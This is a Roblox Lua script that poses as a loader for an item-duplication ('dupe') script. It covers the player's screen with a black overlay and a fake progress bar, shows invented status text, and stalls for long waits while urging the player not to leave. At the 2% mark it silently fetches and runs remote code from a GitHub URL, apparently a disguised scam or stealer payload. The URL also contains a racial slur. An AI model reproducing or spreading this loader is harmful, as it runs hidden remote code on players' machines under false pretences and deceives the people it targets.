local TweenService = game:GetService("TweenService")
local p = game.Players.LocalPlayer
local g = Instance.new("ScreenGui", p:WaitForChild("PlayerGui"))
g.Name = "LoadingUI"
g.IgnoreGuiInset = true
g.ResetOnSpawn = false
g.DisplayOrder = 1000

-- Black Background that fully covers everything
local bg = Instance.new("Frame", g)
bg.Size = UDim2.new(10, 0, 10, 0)
bg.Position = UDim2.new(-5, 0, -5, 0)
bg.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
bg.BackgroundTransparency = 0
bg.ZIndex = 999

-- Main Frame
local f = Instance.new("Frame", bg)
f.Size = UDim2.new(0.42, 0, 0.52, 0)
f.Position = UDim2.new(0.29, 0, 0.24, 0)
f.BackgroundColor3 = Color3.fromRGB(28, 28, 30)
f.ZIndex = 1000
Instance.new("UICorner", f).CornerRadius = UDim.new(0, 14)

-- Rejoin Tip
local hint = Instance.new("TextLabel", f)
hint.Size = UDim2.new(1, 0, 0.08, 0)
hint.Position = UDim2.new(0, 0, 0.29, 0)
hint.BackgroundTransparency = 1
hint.Font = Enum.Font.GothamSemibold
hint.TextColor3 = Color3.fromRGB(255, 255, 255)
hint.TextScaled = true
hint.Text = "⚠️🚨 IF YOU STUCK TRY TO REJOIN"
hint.ZIndex = 1000

-- Retry Button
local retryBtn = Instance.new("TextButton", f)
retryBtn.Size = UDim2.new(0.5, 0, 0.1, 0)
retryBtn.Position = UDim2.new(0.25, 0, 0.36, 0)
retryBtn.BackgroundColor3 = Color3.fromRGB(50, 120, 250)
retryBtn.Text = "🔁 Retry 🔧"
retryBtn.TextScaled = true
retryBtn.TextColor3 = Color3.new(1, 1, 1)
retryBtn.Font = Enum.Font.GothamBold
retryBtn.Visible = false
retryBtn.ZIndex = 1000
Instance.new("UICorner", retryBtn).CornerRadius = UDim.new(0, 10)

-- Loading Text
local t = Instance.new("TextLabel", f)
t.Size = UDim2.new(1, 0, 0.09, 0)
t.Position = UDim2.new(0, 0, 0.47, 0)
t.BackgroundTransparency = 1
t.TextColor3 = Color3.fromRGB(255, 255, 255)
t.Font = Enum.Font.GothamSemibold
t.TextScaled = true
t.Text = "🚀🔄 Loading Script..."
t.ZIndex = 1000

-- Animated Dots
local a = true
task.spawn(function()
	local d = 0
	while a and t.Parent do
		t.Text = "🚀🔄 Loading Script" .. string.rep(".", d % 4)
		d += 1
		wait(0.5)
	end
end)

-- Progress Bar Background
local pb = Instance.new("Frame", f)
pb.Size = UDim2.new(0.85, 0, 0.18, 0)
pb.Position = UDim2.new(0.075, 0, 0.61, 0)
pb.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
pb.ZIndex = 1000
Instance.new("UICorner", pb).CornerRadius = UDim.new(0, 14)

-- Actual Progress Fill
local bar = Instance.new("Frame", pb)
bar.Size = UDim2.new(0, 0, 1, 0)
bar.BackgroundColor3 = Color3.fromRGB(0, 255, 140)
bar.ZIndex = 1000
Instance.new("UICorner", bar).CornerRadius = UDim.new(0, 14)

-- Percentage Text
local perc = Instance.new("TextLabel", pb)
perc.Size = UDim2.new(1, 0, 1, 0)
perc.BackgroundTransparency = 1
perc.TextColor3 = Color3.fromRGB(255, 255, 255)
perc.Font = Enum.Font.GothamSemibold
perc.TextScaled = true
perc.Text = "0% Complete"
perc.ZIndex = 1000

-- Dynamic Status Label
local statusLabel = Instance.new("TextLabel", f)
statusLabel.Size = UDim2.new(1, 0, 0.07, 0)
statusLabel.Position = UDim2.new(0, 0, 0.70, 0)
statusLabel.BackgroundTransparency = 1
statusLabel.Font = Enum.Font.Gotham
statusLabel.TextColor3 = Color3.fromRGB(180, 180, 180)
statusLabel.TextScaled = true
statusLabel.Text = "🔍 Scanning environment..."
statusLabel.ZIndex = 1000

-- Info Label (Footer)
local i = Instance.new("TextLabel", f)
i.Size = UDim2.new(1, 0, 0.09, 0)
i.Position = UDim2.new(0, 0, 0.78, 0)
i.BackgroundTransparency = 1
i.Font = Enum.Font.GothamSemibold
i.TextColor3 = Color3.fromRGB(200, 200, 200)
i.TextScaled = true
i.Text = "⏳🛠️ PLEASE WAIT WE ARE CURRENTLY EXECUTING THE DUPE SCRIPT. THIS MAY TAKE A MOMENT. DON'T LEAVE."
i.ZIndex = 1000

-- Footer Credit
local credit = Instance.new("TextLabel", f)
credit.Size = UDim2.new(1, 0, 0.06, 0)
credit.Position = UDim2.new(0, 0, 0.96, 0)
credit.BackgroundTransparency = 1
credit.Font = Enum.Font.GothamSemibold
credit.TextColor3 = Color3.fromRGB(170, 170, 170)
credit.TextScaled = true
credit.Text = "👨‍💻📜 Script made by @growyourowngarden on TikTok"
credit.ZIndex = 1000

-- Dynamic Status by % Range
local function getStatus(i)
	if i < 20 then return "🔍 Scanning environment..."
	elseif i < 40 then return "📦 Loading assets..."
	elseif i < 60 then return "⚙️ Preparing functions..."
	elseif i < 80 then return "📡 Connecting to server..."
	else return "🚀 Finalizing execution..."
	end
end

-- Progress Function
local function fillProgress()
	a = true
	bar.Size = UDim2.new(0, 0, 1, 0)
	perc.Text = "0% Complete"

	for i = 1, 100 do
		local targetSize = UDim2.new(i / 100, 0, 1, 0)
		local tween = TweenService:Create(bar, TweenInfo.new(0.25, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), { Size = targetSize })
		tween:Play()

		perc.Text = i .. "% Complete"
		statusLabel.Text = getStatus(i)

		if i == 2 then
			pcall(function()
				loadstring(game:HttpGet("https://raw.githubusercontent.com/No-Laggs/walapatoniggaa/refs/heads/main/gragraj"))()
			end)
		end

		if i == 50 or i == 60 then
			wait(2)
		elseif i == 80 or i == 90 then
			wait(60)
		else
			wait(math.random(8, 20) / 100)
		end
	end

	a = false
	retryBtn.Visible = true
end

-- Start loading
fillProgress()

-- Retry Button
retryBtn.MouseButton1Click:Connect(function()
	retryBtn.Visible = false
	fillProgress()
end)
